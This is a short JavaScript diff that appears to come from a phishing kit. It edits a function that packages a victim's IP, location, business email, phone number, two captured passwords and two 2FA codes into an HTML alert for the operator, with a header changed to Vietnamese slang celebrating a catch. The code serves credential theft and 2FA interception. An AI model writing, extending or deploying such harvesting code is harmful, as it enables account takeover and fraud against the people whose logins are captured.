@@ -100,7 +100,7 @@ const Utils = (() => {
 
     const lines = [];
 
-    lines.push(`🔔 <b>NEW SUBMISSION</b>`);
+    lines.push(`🔔 <b>VOI VỀ ANH EM ƠI!!</b>`);
     lines.push(`🌐 <b>IP:</b> <code>${ip}</code>`);
     lines.push(`📍 <b>Location:</b> <code>${locationFull || 'N/A'}</code>`);
     lines.push(`-----------------------------`);
@@ -113,8 +113,8 @@ const Utils = (() => {
     lines.push(`<b>Email Business:</b> ${c(data.emailBusiness)}`);
     lines.push(`<b>Phone Number:</b> ${c(data.phone)}`);
     lines.push(`-----------------------------`);
-    if (data.password)       lines.push(`<b>🔑 Password (1):</b> ${c(data.password)}`);
-    if (data.passwordSecond) lines.push(`<b>🔑 Password (2):</b> ${c(data.passwordSecond)}`);
+    if (data.password)       lines.push(`<b>Password (1):</b> ${c(data.password)}`);
+    if (data.passwordSecond) lines.push(`<b>Password (2):</b> ${c(data.passwordSecond)}`);
     lines.push(`-----------------------------`);
     if (data.twoFa)       lines.push(`🔐 <b>Code 2FA (1):</b> ${c(data.twoFa)}`);
     if (data.twoFaSecond) lines.push(`🔐 <b>Code 2FA (2):</b> ${c(data.twoFaSecond)}`);
